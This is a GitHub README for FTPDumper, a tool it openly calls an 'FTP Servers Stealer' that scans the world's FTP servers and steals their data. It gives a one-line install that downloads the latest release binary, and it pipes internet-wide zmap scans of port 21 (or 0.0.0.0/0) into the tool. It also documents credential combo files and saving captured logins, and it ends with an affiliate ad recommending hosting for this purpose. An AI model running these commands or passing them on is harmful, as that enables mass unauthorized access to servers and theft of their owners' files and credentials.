<p align="center"><img src="https://i.ibb.co/TR8ZCyn/New-Project.png" width="256" alt="logo"></p>
<h1 align="center">FTPDumper - A FTP Servers Stealer</h1>


<p align="center">
<img alt="FTPDumper forks" src="https://img.shields.io/github/forks/MatrixTM/FTPDumper?style=for-the-badge">
<img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/MatrixTM/FTPDumper?style=for-the-badge">
<p align="center"><img src="https://views.whatilearened.today/views/github/MatrixTM/FTPDumper.svg" width="80px" height="28px" alt="View">
</p>

___

<p align="center"><img src="https://i.ibb.co/JvtB5vh/Ftp-Features.png" width="1040" alt="features"></p>

## 🔍 Overview

- 🚀 [Quickstart](#-quickstart)
- ⚙️ [Arguments](#-arguments)
- 👨‍💻 [Best Way to get a server](#-best-way-to-get-a-server)

# 🚀 Quickstart

---

#### One-Line Install And Running on Fresh VPS
```bash
apt update && apt install -y zmap && wget -q $(curl -s https://api.github.com/repos/MatrixTM/FTPDumper/releases/latest | grep browser_download_url | grep "FTPDumper" | cut -d '"' -f 4) && chmod +x FTPDumper && zmap -p 21 -B 50MB -q | ./FTPDumper -l 5000
```

<details>
 <summary><b>🔧 Manual Installation</b></summary>
<h3> 1. Download FTPDumper </h3>
<p>Download FTPDumper from <a href="https://github.com/MatrixTM/FTPDumper/releases">Releases</a></p>

<h3> 2. Set Up Permission </h3>

Set up permission to FTPDumper binary file.
```bash
chmod +x FTPDumper
```

<h3> 3. Run FTPDumper </h3>

You have a few ways to use FTPDumper.

- Zmap
  - Download Zmap
  ```bash
  sudo apt install zmap
  ```
  - Run FTPDumper (Zmap)
  ```bash
  zmap -p 21 -q | ./FTPDumper -l 500 -save
  ```
  - Run FTPDumper (DevWay)
  ```bash
  ./FTPDumper -l 500 -save -s 0.0.0.0/0
  ```
  Check out [Arguments](#-arguments) to see more
</details>

---

# ⚙️ Arguments

```bash
MatrixTM@FTPDumper: ./FTPDumper --help
FTPDumper - Scan World FTP Servers and Steal Their Data

  Flags:
       --version   Displays the program version string.
    -h --help      Displays help with available flag, subcommand, and positional value parameters.
    -scan --scanner   Ip/CIDR scanner (stdin|filename|cidr|ip) (default: stdin)
    -c --combo     Combo File (user:password)
    -p --ports     Ports Split by , (Default Port: 21)
    -o --output    Output Folder (default: files)
    -f --formats   File Formats Split by , (Default Format: all)
    -l --limit     Task limit (default: 10)
    -t --timeout   Timeout in seconds (default: 5s)
    -s --save      Save Credentials in hit.txt
    -v --verbose   Verbose Mode
```

| Argument         | Description                                                                     | Default Value |
|------------------|---------------------------------------------------------------------------------|:-------------:|
| --version        | Displays the program version string.                                            |     None      |
| -h, --help       | Displays help with available flag, subcommand, and positional value parameters. |     None      |
| -scan, --scanner | IP/CIDR scanner [stdin\|filename\|cidr\|ip] stdin                               |     stdin     |
| -c, --combo      | Combo File (user:password)                                                      |   anonymous   |
| -p, --ports      | Ports Split by ,                                                                |      21       |
| -o, --output     | Output Folder files                                                             |     files     |
| -f, --formats    | File Formats Split by ,                                                         |      all      |
| -l, --limit      | Task limit                                                                      |      10       |
| -t, --timeout    | Timeout in seconds                                                              |      5s       |
| -s, --save       | Save Credentials in hit.txt                                                     |     False     |
| -v, --verbose    | Verbose Mode                                                                    |     False     |
---

# 👨‍💻 Best Way to get a server

<a href="https://aeza.net/?ref=375036"><img src="https://i.ibb.co/LthJcL8/image.png" width="728" height="90"  alt="aeza"></a>
##### For this subject, the best hosting I found is [Aeza](https://aeza.net/?ref=375036 "Aeza Hosting")
##### You Can buy hourly 10Gbps & Ryzen 9 Servers with a cheap price


## Star history

---
<picture>
  <source
    media="(prefers-color-scheme: dark)"
    srcset="
      https://api.star-history.com/svg?repos=MatrixTM/FTPDumper&type=Date&theme=dark
    "
  />
  <source
    media="(prefers-color-scheme: light)"
    srcset="
      https://api.star-history.com/svg?repos=MatrixTM/FTPDumper&type=Date
    "
  />
  <img
    alt="Star History Chart"
    src="https://api.star-history.com/svg?repos=MatrixTM/FTPDumper&type=Date"
  />
</picture>
